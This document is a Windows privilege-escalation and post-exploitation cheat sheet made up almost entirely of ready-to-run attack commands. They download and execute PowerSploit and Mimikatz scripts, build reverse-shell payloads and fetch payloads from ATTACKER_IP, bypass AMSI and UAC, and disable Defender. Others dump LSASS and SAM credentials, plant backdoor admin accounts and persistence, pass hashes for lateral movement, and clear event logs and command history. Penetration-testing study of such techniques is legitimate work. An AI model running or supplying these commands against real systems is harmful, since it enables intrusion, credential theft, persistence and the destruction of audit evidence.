# Windows Privilege Escalation and Post-Exploitation Cheat Sheet

## Initial Reconnaissance

### System Information
```powershell
# Basic system information
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# Hotfixes and patches
wmic qfe get Caption,Description,HotFixID,InstalledOn

# System architecture
echo %PROCESSOR_ARCHITECTURE%

# List drives
wmic logicaldisk get caption,description,providername

# System hostname
hostname
```

### User Information
```powershell
# Current user context
whoami
whoami /priv
whoami /groups
echo %username%

# All user accounts
net user
wmic useraccount get name,sid

# User account details
net user [username]

# Administrator accounts
net localgroup Administrators

# Domain information (if joined to a domain)
net user /domain
net group /domain
net group "Domain Admins" /domain
```

### Network Information
```powershell
# Network interfaces
ipconfig /all
netsh interface show interface

# Routing table
route print

# Active connections
netstat -ano
netstat -anob  # Shows executables

# Firewall status
netsh advfirewall show currentprofile
netsh firewall show state
netsh firewall show config

# Network shares
net share
wmic share get name,path,status

# Network neighbor info
arp -a

# Hosts file
type C:\Windows\System32\drivers\etc\hosts
```

### Process Information
```powershell
# Process list
tasklist
tasklist /v
wmic process get caption,executablepath,commandline

# Services
net start
wmic service get name,displayname,pathname,startmode

# Service permissions
sc qc [servicename]
sc query [servicename]

# Check for unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

## Automated Enumeration Tools

```powershell
# PowerUp
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks"

# Sherlock (Windows Exploit Suggester)
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1'); Find-AllVulns"

# JAWS
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1')"

# Seatbelt
.\Seatbelt.exe -group=all

# winPEAS
winPEAS.exe

# PowerSploit
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-PrivescAudit"
```

## Kernel Exploits

### Check Windows Version and Patch Level
```powershell
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Common Windows Kernel Exploits

1. **MS16-032** (Secondary Logon Handle) - Windows 7/8/10 & Server 2008/2012
   ```powershell
   powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1'); Invoke-MS16032"
   ```

2. **CVE-2021-36934** (HiveNightmare/SeriousSAM) - Windows 10/11
   ```powershell
   # Check if vulnerable
   icacls C:\Windows\System32\config\SAM

   # Exploit if readable
   copy C:\Windows\System32\config\SAM C:\temp\
   copy C:\Windows\System32\config\SYSTEM C:\temp\
   # Then extract hashes offline
   ```

3. **PrintNightmare (CVE-2021-34527)** - Windows Print Spooler
   ```powershell
   # Check if Print Spooler is running
   Get-Service Spooler

   # Exploit using available POCs from GitHub
   ```

4. **EternalBlue (MS17-010)** - SMB vulnerability for Windows 7 and Server 2008 R2
   ```powershell
   # Check if vulnerable
   Test-Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\hotfix\KB4013389"
   ```

## Service Misconfigurations

### Unquoted Service Paths
```powershell
# Find services with unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Check specific service
sc qc [servicename]

# Create malicious executable in path
copy C:\Windows\System32\cmd.exe "C:\Program.exe"
```

### Weak Service Permissions
```powershell
# PowerUp to check service permissions
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Get-ServiceUnquoted; Get-ModifiableServiceFile; Get-ModifiableService"

# Modify service binary path manually
sc config [servicename] binpath= "cmd.exe /c net user evil password123 /add && net localgroup administrators evil /add"

# Start/restart service
net stop [servicename]
net start [servicename]
```

### Registry AutoRuns
```powershell
# Check autoruns
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Add registry autorun (if writable)
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v evil /t REG_SZ /d "C:\path\to\evil.exe"
```

## Stored Credentials

### Check for Stored Credentials
```powershell
# Windows credential manager
cmdkey /list

# Use stored credentials
runas /savecred /user:DOMAIN\Username "cmd.exe /c whoami > C:\Users\Public\whoami.txt"

# Check for saved credentials in PowerShell
powershell -ep bypass -c "Get-ChildItem -Path C:\Users -Include *.xml,*.txt,*.ini,*.config -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password'"
```

### SAM and SYSTEM Hashes
```powershell
# Copy SAM, SYSTEM, and SECURITY files
copy C:\Windows\System32\config\SAM C:\temp\
copy C:\Windows\System32\config\SYSTEM C:\temp\
copy C:\Windows\System32\config\SECURITY C:\temp\

# Registry export method
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
reg save HKLM\SECURITY C:\temp\security.hive
```

### LSASS Memory Dump
```powershell
# Using Task Manager
# Right-click on lsass.exe process -> Create dump file

# Using procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Using Mimikatz (requires admin privileges)
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# PowerShell alternative
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); Get-Process lsass | Out-Minidump"
```

### Search for Credentials in Files
```powershell
# Find files containing password
findstr /si password *.txt *.ini *.config *.xml

# Search for specific patterns in all files
findstr /spin "password" *.*

# PowerShell search
powershell -ep bypass -c "Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config,*.xml,*.ps1,*.bat -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password' | Out-File C:\temp\found_passwords.txt"
```

## UAC Bypass Techniques

### Check UAC Settings
```powershell
# Check UAC level
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

### UAC Bypass Methods
```powershell
# Fodhelper method
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "cmd.exe" -Force
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
Start-Process fodhelper.exe

# EventViewer method
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe /c whoami > C:\Users\Public\whoami.txt" /f
eventvwr.exe
```

## Token Impersonation

### List Tokens
```powershell
# Using Incognito (Metasploit)
load incognito
list_tokens -u

# Using PowerShell
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1'); Invoke-TokenManipulation -ShowAll"
```

### Impersonate Tokens
```powershell
# Using Incognito
impersonate_token DOMAIN\\Username

# Using PowerShell
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1'); Invoke-TokenManipulation -ImpersonateUser -Username 'DOMAIN\\user'"
```

### Check for Always Install Elevated
```powershell
# Check registry settings
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are 1, create MSI payload and execute
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f msi -o evil.msi
msiexec /quiet /qn /i C:\path\to\evil.msi
```

## Scheduled Tasks

### Enumerate Scheduled Tasks
```powershell
# List all scheduled tasks
schtasks /query /fo LIST /v

# PowerShell method
Get-ScheduledTask | where {$_.TaskPath -notlike "*Microsoft*"} | ft TaskName,TaskPath,State

# Check for writable task files
icacls C:\Windows\Tasks\* /T | findstr /i "(F) (M) (W) :\"
```

### Exploiting Scheduled Tasks
```powershell
# Create a new task (requires privileges)
schtasks /create /tn "MyTask" /tr "C:\path\to\evil.exe" /sc ONCE /st 00:00 /ru "SYSTEM"
schtasks /run /tn "MyTask"

# Modify existing task
schtasks /change /tn "ExistingTask" /tr "C:\path\to\evil.exe"
```

## DLL Hijacking

### Find Potential DLL Hijacking Opportunities
```powershell
# Process Monitor to identify missing DLLs
# Look for "NAME NOT FOUND" results for DLL loads

# Check for DLL search order issues
# Create malicious DLL in the application directory
```

### DLL Creation
```powershell
# Malicious DLL example
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f dll -o evil.dll

# C code for DLL
/*
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net user evil password123 /add && net localgroup administrators evil /add");
    }
    return TRUE;
}
*/
```

## File Permissions Vulnerabilities

### Check for Writable Directories and Files
```powershell
# Important system directories
icacls "C:\Program Files" /T | findstr /i "(F) (M) (W) :\"
icacls "C:\Program Files (x86)" /T | findstr /i "(F) (M) (W) :\"
icacls "C:\Windows" /T | findstr /i "(F) (M) (W) Everyone"

# Check for writeable executables
Get-ChildItem "C:\Program Files" -Recurse -ErrorAction SilentlyContinue | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```

### Exploiting Writable Files
```powershell
# Replace executable with malicious one
copy /Y evil.exe "C:\Program Files\Vulnerable App\app.exe"

# Create an application shim for bypass
```

## AppLocker Bypass

### Check AppLocker Rules
```powershell
# View AppLocker rules
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Check for policy enforcement
Get-AppLockerPolicy -Effective -XML | Set-Content C:\temp\AlPolicy.xml
```

### Bypass Methods
```powershell
# Using PowerShell's AttachTo property
powershell.exe -NoP -NonI -w Hidden -Exec Bypass -c "Invoke-Expression(Get-Content C:\path\to\script.ps1)"

# Using rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1');");

# Using regsvr32
regsvr32 /s /n /u /i:http://ATTACKER_IP/payload.sct scrobj.dll

# Using mshta
mshta http://ATTACKER_IP/payload.hta
```

## Windows Defender Bypass

### Check Defender Status
```powershell
# Check Defender status
Get-MpComputerStatus

# Check exclusions
Get-MpPreference | select *Exclusion*
```

### Disable Defender (requires admin)
```powershell
# Disable real-time monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable scanning of all downloaded files and attachments
Set-MpPreference -DisableIOAVProtection $true

# Disable behavior monitoring
Set-MpPreference -DisableBehaviorMonitoring $true

# Add exclusion path
Set-MpPreference -ExclusionPath "C:\temp"
```

### Obfuscation Techniques
```powershell
# Base64 encode PowerShell command
$command = "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand

# Use AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## Post-Exploitation

### Maintaining Access

#### Create Backdoor User
```powershell
# Add local administrator
net user evil password123 /add
net localgroup Administrators evil /add

# Add domain user (with domain admin privileges)
net user evil password123 /add /domain
net group "Domain Admins" evil /add /domain
```

#### Scheduled Tasks Persistence
```powershell
# Create daily task for persistence
schtasks /create /sc daily /tn "WindowsUpdate" /tr "powershell.exe -WindowStyle hidden -c 'IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/payload.ps1'')'" /st 12:00 /ru System
```

#### Registry Persistence
```powershell
# Run key
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "powershell.exe -WindowStyle hidden -c 'IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/payload.ps1'')'"

# Winlogon Helper
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,powershell.exe -WindowStyle hidden -c 'IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/payload.ps1'')'"

# WMI event subscription
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Persistence/Persistence.psm1'); Install-EventPersistence"
```

#### Service Persistence
```powershell
# Create a backdoor service
sc create backdoor binpath= "cmd.exe /c powershell.exe -WindowStyle hidden -c 'IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/payload.ps1'')'"
sc config backdoor start= auto
net start backdoor
```

### Information Gathering

#### Dumping Credentials
```powershell
# Using Mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
kerberos::list

# PowerShell alternative
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'"
```

#### Extract Browser Data
```powershell
# Using LaZagne
LaZagne.exe all

# PowerShell alternative for Chrome
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dpnishant/shellcode/master/scripts/GetChromeCreds.ps1')"
```

#### Collect System Information
```powershell
# Network information
ipconfig /all > C:\temp\network_info.txt
netstat -ano > C:\temp\netstat_info.txt

# User information
net user > C:\temp\users.txt
net localgroup > C:\temp\groups.txt

# Domain information (if applicable)
nltest /domain_trusts > C:\temp\domain_trusts.txt
net group "Domain Admins" /domain > C:\temp\domain_admins.txt

# Installed software
wmic product get name,version > C:\temp\installed_software.txt
```

### Lateral Movement

#### Pass-the-Hash
```powershell
# Using Mimikatz PtH
sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:cmd.exe

# Using PowerShell PtH
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1'); Invoke-WMIExec -Target TARGET_IP -Username USERNAME -Hash NTLM_HASH -Command 'cmd.exe /c calc.exe'"
```

#### WMI Remote Execution
```powershell
# Using WMIC
wmic /node:TARGET_IP /user:DOMAIN\\USERNAME /password:PASSWORD process call create "cmd.exe /c command"

# Using PowerShell
Invoke-WmiMethod -ComputerName TARGET_IP -Credential $cred -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c command"
```

#### PsExec
```powershell
# Using PsExec
psexec.exe \\TARGET_IP -u DOMAIN\USERNAME -p PASSWORD cmd.exe

# PowerShell remoting
Enter-PSSession -ComputerName TARGET_IP -Credential (Get-Credential)
```

#### RDP Tunneling
```powershell
# Enable RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# RDP tunneling via SSH
# On attacker: ssh -L 3389:TARGET_IP:3389 PIVOT_USER@PIVOT_IP
# Then connect to RDP on localhost:3389
```

### Covering Tracks

#### Clear Event Logs
```powershell
# Clear individual logs
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Clear all logs
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"

# PowerShell alternative
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }
```

#### Remove Command History
```powershell
# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath

# Clear command history
del %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

#### Remove Temporary Files
```powershell
# Clear temp files
del /F /Q %TEMP%\*
rmdir /S /Q %TEMP%\*
```

## Helpful One-Liners

```powershell
# Find all files modified in the last day
Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-1) }

# Check for weak folder permissions recursively
Get-ChildItem "C:\Program Files" -Recurse -ErrorAction SilentlyContinue | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

# Find all PowerShell scripts on the system
Get-ChildItem -Path C:\ -Include *.ps1 -File -Recurse -ErrorAction SilentlyContinue

# Find potential passwords in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Find files containing specific strings
Get-ChildItem C:\ -recurse -ErrorAction SilentlyContinue | Select-String -pattern "password" | group path | select name

# Download file without IE dialogs
certutil -urlcache -split -f "http://ATTACKER_IP/payload.exe" payload.exe

# PowerShell alternate encoding download
powershell -ep bypass -c "(New-Object System.Net.WebClient).DownloadFile('http://ATTACKER_IP/payload.exe', 'C:\temp\payload.exe')"

# Base64 encode/decode
[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("Text to encode"))
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QmFzZTY0IHN0cmluZw=="))
```

## Important Tools to Upload

```
- Mimikatz (credential dumping/pass-the-hash)
- PowerSploit (PowerShell post-exploitation framework)
- PowerView (Active Directory enumeration)
- SharpHound/BloodHound (AD visualizing/attack paths)
- ProcDump (memory dumping)
- LaZagne (credential recovery)
- Sysinternals Suite (especially PsExec, AccessChk)
- Rubeus (Kerberos exploitation)
- Seatbelt (system enumeration utility)
```

## Final Notes

1. Always be methodical in your approach and document findings
2. Look for misconfigurations in addition to known vulnerabilities
3. Try to obtain credentials before trying exploits whenever possible
4. Pay attention to user permissions and group memberships
5. Check for AV/EDR before running potentially flagged tools
6. Look for lateral movement opportunities after gaining initial access
7. Consider AMSI/Script Block Logging bypass techniques for PowerShell
8. Customize your attack paths based on environment (Domain vs. Standalone)
